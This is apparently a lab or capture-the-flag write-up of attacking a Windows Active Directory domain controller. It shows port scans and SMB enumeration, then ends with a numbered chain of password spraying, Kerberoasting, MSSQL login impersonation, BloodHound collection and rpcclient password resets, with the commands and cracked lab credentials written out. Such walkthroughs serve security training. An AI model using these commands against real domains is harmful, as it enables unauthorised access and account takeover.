
![image](https://github.com/user-attachments/assets/0a0ce058-76ef-4a32-8242-cc94ddb2c6fc)
![image](https://github.com/user-attachments/assets/c7c4cc31-0b3e-44fb-b42d-b53d4688fa2f)
![image](https://github.com/user-attachments/assets/602fd71c-64a6-47f9-b7d6-a12f228d3130)
```
 sudo nmap -Pn -n -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,3389,5985,8530,8531,9389,47001,49664-49668,49671,49675,49684,49685,49691,49700,49701,49712,49780,49810,58538 -sC -sV 192.168.207.40
[sudo] password for qin: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-28 15:08 AEST
Nmap scan report for 192.168.207.40
Host is up (0.099s latency).

PORT      STATE  SERVICE       VERSION
53/tcp    open   domain        Simple DNS Plus
80/tcp    open   http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-28 05:08:55Z)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-28T05:10:04+00:00; +6s from scanner time.
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
445/tcp   open   microsoft-ds?
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
|_ssl-date: 2025-05-28T05:10:04+00:00; +6s from scanner time.
1433/tcp  open   ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   192.168.207.40:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   192.168.207.40:1433: 
|     Target_Name: HAERO
|     NetBIOS_Domain_Name: HAERO
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: hokkaido-aerospace.com
|     DNS_Computer_Name: dc.hokkaido-aerospace.com
|     DNS_Tree_Name: hokkaido-aerospace.com
|_    Product_Version: 10.0.20348
|_ssl-date: 2025-05-28T05:10:04+00:00; +6s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-08-02T02:13:54
|_Not valid after:  2054-08-02T02:13:54
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-28T05:10:04+00:00; +6s from scanner time.
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
3269/tcp  open   ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
|_ssl-date: 2025-05-28T05:10:04+00:00; +7s from scanner time.
3389/tcp  open   ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HAERO
|   NetBIOS_Domain_Name: HAERO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hokkaido-aerospace.com
|   DNS_Computer_Name: dc.hokkaido-aerospace.com
|   DNS_Tree_Name: hokkaido-aerospace.com
|   Product_Version: 10.0.20348
|_  System_Time: 2025-05-28T05:09:54+00:00
|_ssl-date: 2025-05-28T05:10:04+00:00; +6s from scanner time.
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Not valid before: 2025-05-27T05:01:23
|_Not valid after:  2025-11-26T05:01:23
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8530/tcp  open   http          Microsoft IIS httpd 10.0
|_http-title: 403 - Forbidden: Access is denied.
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
8531/tcp  open   unknown
9389/tcp  open   mc-nmf        .NET Message Framing
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49668/tcp open   msrpc         Microsoft Windows RPC
49671/tcp open   msrpc         Microsoft Windows RPC
49675/tcp open   msrpc         Microsoft Windows RPC
49684/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
49685/tcp open   msrpc         Microsoft Windows RPC
49691/tcp open   msrpc         Microsoft Windows RPC
49700/tcp open   msrpc         Microsoft Windows RPC
49701/tcp open   msrpc         Microsoft Windows RPC
49712/tcp open   msrpc         Microsoft Windows RPC
49780/tcp closed unknown
49810/tcp open   msrpc         Microsoft Windows RPC
58538/tcp open   ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-05-28T05:10:04+00:00; +6s from scanner time.
| ms-sql-ntlm-info: 
|   192.168.207.40:58538: 
|     Target_Name: HAERO
|     NetBIOS_Domain_Name: HAERO
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: hokkaido-aerospace.com
|     DNS_Computer_Name: dc.hokkaido-aerospace.com
|     DNS_Tree_Name: hokkaido-aerospace.com
|_    Product_Version: 10.0.20348
| ms-sql-info: 
|   192.168.207.40:58538: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 58538
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-08-02T02:13:54
|_Not valid after:  2054-08-02T02:13:54
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-28T05:09:57
|_  start_date: N/A
|_clock-skew: mean: 6s, deviation: 0s, median: 5s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.56 seconds
```
![image](https://github.com/user-attachments/assets/6a01023f-c1d1-424f-ac48-e7385616f294)
![image](https://github.com/user-attachments/assets/9688ecbd-d964-4d1a-83e6-e158b87acf43)
![image](https://github.com/user-attachments/assets/d4d683af-c674-47b0-a0ca-32b7f275d46f)
````
 enum4linux-ng 192.168.207.40                                                         
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 192.168.207.40
[*] Username ......... ''
[*] Random Username .. 'rxzrzmtu'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 =======================================
|    Listener Scan on 192.168.207.40    |
 =======================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ======================================================
|    Domain Information via LDAP for 192.168.207.40    |
 ======================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: hokkaido-aerospace.com

 =============================================================
|    NetBIOS Names and Workgroup/Domain for 192.168.207.40    |
 =============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ===========================================
|    SMB Dialect Check on 192.168.207.40    |
 ===========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                                                                                                
  SMB 1.0: false                                                                                                                                                   
  SMB 2.02: true                                                                                                                                                   
  SMB 2.1: true                                                                                                                                                    
  SMB 3.0: true                                                                                                                                                    
  SMB 3.1.1: true                                                                                                                                                  
Preferred dialect: SMB 3.0                                                                                                                                         
SMB1 only: false                                                                                                                                                   
SMB signing required: true                                                                                                                                         

 =============================================================
|    Domain Information via SMB session for 192.168.207.40    |
 =============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC                                                                                                                                          
NetBIOS domain name: HAERO                                                                                                                                         
DNS domain: hokkaido-aerospace.com                                                                                                                                 
FQDN: dc.hokkaido-aerospace.com                                                                                                                                    
Derived membership: domain member                                                                                                                                  
Derived domain: HAERO                                                                                                                                              

 ===========================================
|    RPC Session Check on 192.168.207.40    |
 ===========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[-] Could not establish random user session: STATUS_LOGON_FAILURE

 =====================================================
|    Domain Information via RPC for 192.168.207.40    |
 =====================================================
[+] Domain: HAERO
[+] Domain SID: S-1-5-21-3227296914-974780204-1325941497
[+] Membership: domain member

 =================================================
|    OS Information via RPC for 192.168.207.40    |
 =================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016                                                                                                           
OS version: '10.0'                                                                                                                                                 
OS release: ''                                                                                                                                                     
OS build: '20348'                                                                                                                                                  
Native OS: not supported                                                                                                                                           
Native LAN manager: not supported                                                                                                                                  
Platform id: null                                                                                                                                                  
Server type: null                                                                                                                                                  
Server type string: null                                                                                                                                           

 =======================================
|    Users via RPC on 192.168.207.40    |
 =======================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 ========================================
|    Groups via RPC on 192.168.207.40    |
 ========================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 ========================================
|    Shares via RPC on 192.168.207.40    |
 ========================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 ===========================================
|    Policies via RPC for 192.168.207.40    |
 ===========================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 ===========================================
|    Printers via RPC for 192.168.207.40    |
 ===========================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

Completed after 28.70 seconds
````

![image](https://github.com/user-attachments/assets/dbdb2190-df5f-477f-9f98-7c2af3f50302)
![image](https://github.com/user-attachments/assets/749affd7-d658-4f16-b9b6-377c290e2214)
![image](https://github.com/user-attachments/assets/729a15ad-f130-4f84-a510-7edb6e62e07e)
![image](https://github.com/user-attachments/assets/37d5799c-b1ad-4b1c-becd-607968f4f657)
![image](https://github.com/user-attachments/assets/d4ac8489-e2e5-4ae6-8558-b95f10d9cb3c)
![image](https://github.com/user-attachments/assets/e24798e6-ad70-41ff-bbc5-863b6f86b41c)
![image](https://github.com/user-attachments/assets/671104f7-4f3b-49d1-a111-a9d78c2aa09f)
![image](https://github.com/user-attachments/assets/3350be7c-b07d-4c84-9c02-1cbe1b27cf75)
![image](https://github.com/user-attachments/assets/359292e7-102f-4a4b-b87b-b9597d3543cb)
![image](https://github.com/user-attachments/assets/a7d8e049-9ceb-4405-a8f1-907b021ead88)
![image](https://github.com/user-attachments/assets/68109ef4-f76c-4cbc-b920-0c5f56a9d70c)
![image](https://github.com/user-attachments/assets/4e7bab6b-71d8-4dc6-9bf3-52d4c9e40dd5)
![image](https://github.com/user-attachments/assets/9a1950be-f05e-4741-a53c-aa063290796a)
![image](https://github.com/user-attachments/assets/60b89bd8-4796-4ed0-ba6d-85c9733cdc2b)
![image](https://github.com/user-attachments/assets/d5ebc4a4-08eb-4724-849d-0dcaf9c97f4d)
![image](https://github.com/user-attachments/assets/f39d1352-7303-402f-998d-4827532780b2)
![image](https://github.com/user-attachments/assets/8eba872e-9599-407f-8264-2c25d24d73ad)
![image](https://github.com/user-attachments/assets/b98fadcc-af80-45d4-a7a6-890428fdb1ff)
![image](https://github.com/user-attachments/assets/cfa30cf0-26e9-4618-b125-1c0a86f55fbd)
![image](https://github.com/user-attachments/assets/a461e5a4-f9bd-45a1-9f4b-68df1b36c6e9)
![image](https://github.com/user-attachments/assets/5f7f8f25-1b2e-4b08-b585-3f062d1c8bf9)

```
hrapp-service has GenericWrite permission to Tier2Admin user Hazel.Green

Get Hazel.Green kerberoast hash and crack

rpcclient into machine with Hazel.Green creds

Tier2Admin user can change password for users in Tier1Admin group

Tier1Admin group only has one user: Molly.Smith
```
![image](https://github.com/user-attachments/assets/86b7ad1c-e1ba-4980-8f1f-6ae9abd95bf7)
![image](https://github.com/user-attachments/assets/68360b05-9f9d-43d2-aab0-03cb2b8f5d97)
![image](https://github.com/user-attachments/assets/10bbedab-2030-49c6-b1b4-618d720b1da9)
![image](https://github.com/user-attachments/assets/0ccaa8b2-c33b-432c-b8f8-725719c05903)

Hmmm... Access is denied
```
To be continued
```


1. http ports 80,5985,8530,47001 --> brute force directory --> no useful info

2. enum4linux-ng --> no useful info

3. kerbrute to brute force username --> get 4 user names: info, administrator, discovery, maintenance --> create user list users.txt

4. password spray --> crackmapexec smb rockyou.txt & other lists take too long but not get valid creds --> try KISS (Keep It Simple Stupid) -u users.txt -p users.txt --> get valid cred info:info

5. smbclient --> get users from \homes --> add to users.txt --> get password_reset.txt from \NETLOGON\temp --> same password_reset.txt under \SYSVOL\hokkaido-aerospace.com\scripts\temp\

6. read password_reset.txt content --> password Start123! --> password spray --> SMB valid cred discovery:Start123!

7. impacket-GetUserSPNs with newly found cred discovery:Start123! --> get two users: discovery, maintenance

8. john to crack maintenance user's hash --> fail

9. impacket-mssqlclient with newly found cred discovery:Start123! --> get in --> get 5 databases, hrappdb looks interesting --> no permission to access hrappdb

10. check if can impersonate any user on MSSQL --> get user: hrappdb-reader
    ```
    SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
    ```
11. login as hrappdb-reader, access database hrappdb, check tables, and read table content --> get username: hrapp-service and password: Untimed$Runny
    ```
    EXECUTE AS LOGIN = 'hrappdb-reader'
    use hrappdb
    SELECT * FROM hrappdb.INFORMATION_SCHEMA.TABLES;
    SELECT * FROM sysauth;
    ```
12. WinRM with newly found cred hrapp-service:Untimed$Runny --> fail

13. generate bloodhound data
    ````
    bloodhound-python -u "hrapp-service" -p 'Untimed$Runny' -d hokkaido-aerospace.com -c all --zip -ns 192.168.207.40
    ````
14. upload to bloodhound --> hrapp-service has GenericWrite Permission To Hazel.Green user which is tier2admin

15. fail to get Hazel.Green hash by
    ```
    certipy-ad shadow auto -u 'hrapp-service'@'hokkaido-aerospace.com' -p 'Untimed$Runny' -account "hazel.green"
    ```
16. try targetKerberoast.py --> get Hazel.Green hash --> crack, password is haze1988
    ```
    python targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 192.168.207.40
    ```
17. rpcclient into machine with Hazel.Green (Tier2Admin) cred and change Tier1Admin user Molly.Smith's password
    ```
    rpcclient -U hokkaido-aerospace.com/'Hazel.Green' 192.168.207.40
    enumdomusers
    enumdomgroups
    querygroupmem 0x475
    setuserinfo2 MOLLY.SMITH 23 'Password123!'
    setuserinfo MOLLY.SMITH 23 'Password123!'
    `````
